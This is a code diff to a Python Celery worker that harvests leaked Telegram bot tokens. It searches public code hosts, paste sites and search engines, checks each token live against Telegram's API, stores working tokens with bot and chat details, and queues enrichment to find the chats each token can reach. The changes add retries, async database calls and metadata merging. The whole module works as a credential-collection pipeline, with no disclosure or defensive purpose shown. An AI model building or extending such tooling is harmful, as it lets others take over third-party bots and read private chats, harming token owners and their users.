@@ -1,5 +1,5 @@
 from app.workers.celery_app import app
-from app.workers.tasks.flow_tasks import enrich_credential # Import for triggering
+from app.workers.tasks.flow_tasks import enrich_credential, async_execute # Import for triggering and DB
 import asyncio # Ensure asyncio is imported
 import random
 from app.core.config import settings
@@ -10,6 +10,7 @@ from app.core.security import security
 from app.core.database import db
 import hashlib
 import logging
+import time
 
 # Configure Task Logger
 logger = logging.getLogger("scanner.tasks")
@@ -65,8 +66,8 @@ async def _save_credentials_async(results, source_name: str):
             extracted_chat_id = item.get("chat_id")
             
             try:
-                # Step 2: Check if already exists (DB is sync, but fast enough)
-                existing = db.table("discovered_credentials").select("id, chat_id").eq("token_hash", token_hash).execute()
+                # Step 2: Check if already exists (Using async_execute)
+                existing = await async_execute(db.table("discovered_credentials").select("id, chat_id").eq("token_hash", token_hash))
                 if existing.data:
                     existing_id = existing.data[0]['id']
                     existing_has_chat = existing.data[0].get('chat_id') is not None
@@ -76,15 +77,23 @@ async def _save_credentials_async(results, source_name: str):
                     logger.info(f"    🔄 [Validate] Token exists (ID: {existing_id}) but missing chat_id. Checking for updates...")
                 
                 # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
+                # Adding localized retry for Telegram API flakes
                 base_url = f"https://api.telegram.org/bot{token}"
-                try:
-                    me_res = await client.get(f"{base_url}/getMe")
-                    me_data = me_res.json()
-                except Exception:
-                    continue
+                me_data = None
+                me_res = None
                 
-                if me_res.status_code != 200 or not me_data.get('ok'):
-                    logger.debug(f"    ❌ [Validate] Token invalid or revoked (HTTP {me_res.status_code})")
+                for attempt in range(2):
+                    try:
+                        me_res = await client.get(f"{base_url}/getMe")
+                        me_data = me_res.json()
+                        if me_res.status_code == 200 and me_data.get('ok'):
+                            break
+                    except Exception:
+                        if attempt == 0: await asyncio.sleep(1)
+                        continue
+                
+                if not me_res or me_res.status_code != 200 or not me_data.get('ok'):
+                    logger.debug(f"    ❌ [Validate] Token invalid or revoked (HTTP {me_res.status_code if me_res else 'timeout'})")
                     continue
                 
                 bot_info = me_data.get('result', {})
@@ -127,40 +136,33 @@ async def _save_credentials_async(results, source_name: str):
                         "status": "active",
                         "meta": {
                             **item.get("meta", {}),
-                            "bot_username": bot_username,
-                            "bot_id": bot_info.get('id'),
-                            "chat_name": chat_name,
-                            "chat_type": chat_type,
-                            "extracted_chat_id": extracted_chat_id
+                            **existing.data[0].get("meta", {}),
+                            "last_seen_source": source_name,
+                            "last_verified_at": time.strftime("%Y-%m-%dT%H:%M:%S")
                         }
                     }
-                    db.table("discovered_credentials").update(update_data).eq("id", existing_id).execute()
+                    if chat_name: update_data["chat_name"] = chat_name
+                    if chat_type: update_data["chat_type"] = chat_type
                     
-                    # Local instantiation for logging
-                    from app.services.broadcaster_srv import BroadcasterService
-                    broadcaster = BroadcasterService()
-                    await broadcaster.send_log(
-                        f"🔄 [{source_name}] **Updated Token!**\n"
-                        f"Bot: @{bot_username}\n"
-                        f"ID: `{existing_id}`\n"
-                        f"Chat: {chat_name or chat_id} ({chat_type or 'extracted'})"
-                    )
+                    await async_execute(db.table("discovered_credentials").update(update_data).eq("id", existing_id))
+                    logger.info(f"    🆙 [Batch] Updated existing record {existing_id} with chat_id {chat_id}")
                     saved_count += 1
-                    
-                    # TRIGGER ENRICHMENT if still missing chat_id or just to be safe
-                    enrich_credential.delay(existing_id)
+                
                 elif existing_id and not chat_id:
                     # Token exists but still no chat_id found in this scan
                     # Trigger enrichment anyway to try recursive discovery
                     enrich_credential.delay(existing_id)
                     pass
-                else:
+                elif not existing_id:
                     # INSERT new record
-                    encrypted_token = security.encrypt(token)
-                    data = {
-                        "bot_token": encrypted_token,
+                    new_data = {
+                        "token": security.encrypt(token),
                         "token_hash": token_hash,
                         "chat_id": chat_id,
+                        "chat_name": chat_name,
+                        "chat_type": chat_type,
+                        "bot_id": str(bot_info.get('id')),
+                        "bot_username": bot_username,
                         "source": source_name,
                         "status": "pending" if not chat_id else "active",
                         "meta": {
@@ -172,7 +174,7 @@ async def _save_credentials_async(results, source_name: str):
                         }
                     }
                     
-                    res = db.table("discovered_credentials").insert(data).execute()
+                    res = await async_execute(db.table("discovered_credentials").insert(new_data))
                     
                     if res.data:
                         new_id = res.data[0]['id']
@@ -410,7 +412,7 @@ async def _scan_github_async(query: str = None):
     await _send_log_async(f"🏁 [GitHub] Finished. Saved {total_saved} unique credentials.")
     return result_msg
 
-@app.task(name="scanner.scan_fofa", bind=True, max_retries=2)
+@app.task(name="scanner.scan_fofa", bind=True, autoretry_for=(Exception,), retry_backoff=True, retry_jitter=True, max_retries=3)
 def scan_fofa(self, query: str = None, country_code: str = None):
     return _run_sync(_scan_fofa_async(self, query, country_code))
 
@@ -472,7 +474,7 @@ async def _scan_fofa_async(task_self, query: str = None, country_code: str = Non
     logger.info(f"🏁 [FOFA] Finished | Total Saved: {total_saved} | Errors: {len(errors)}")
     return result_msg
 
-@app.task(name="scanner.scan_gitlab")
+@app.task(name="scanner.scan_gitlab", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
 def scan_gitlab(query: str = None):
     return _run_sync(_scan_gitlab_async(query))
 
@@ -507,7 +509,7 @@ async def _scan_gitlab_async(query: str = None):
          
     return result_msg
 
-@app.task(name="scanner.scan_bitbucket")
+@app.task(name="scanner.scan_bitbucket", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
 def scan_bitbucket(query: str = None):
     return _run_sync(_scan_bitbucket_async(query))
 
@@ -542,7 +544,7 @@ async def _scan_bitbucket_async(query: str = None):
          
     return result_msg
 
-@app.task(name="scanner.scan_gist")
+@app.task(name="scanner.scan_gist", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
 def scan_gist(query: str = None):
     return _run_sync(_scan_gist_async(query))
 
@@ -577,7 +579,7 @@ async def _scan_gist_async(query: str = None):
          
     return result_msg
 
-@app.task(name="scanner.scan_grepapp")
+@app.task(name="scanner.scan_grepapp", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
 def scan_grepapp(query: str = None):
     return _run_sync(_scan_grepapp_async(query))
 
@@ -612,7 +614,7 @@ async def _scan_grepapp_async(query: str = None):
          
     return result_msg
 
-@app.task(name="scanner.scan_publicwww")
+@app.task(name="scanner.scan_publicwww", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
 def scan_publicwww(query: str = None):
     return _run_sync(_scan_publicwww_async(query))
 
@@ -647,7 +649,7 @@ async def _scan_publicwww_async(query: str = None):
          
     return result_msg
 
-@app.task(name="scanner.scan_pastebin")
+@app.task(name="scanner.scan_pastebin", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
 def scan_pastebin(query: str = None):
     return _run_sync(_scan_pastebin_async(query))
 
@@ -682,7 +684,7 @@ async def _scan_pastebin_async(query: str = None):
          
     return result_msg
 
-@app.task(name="scanner.scan_serper")
+@app.task(name="scanner.scan_serper", autoretry_for=(Exception,), retry_backoff=True, max_retries=3)
 def scan_serper(query: str = None):
     return _run_sync(_scan_serper_async(query))
 
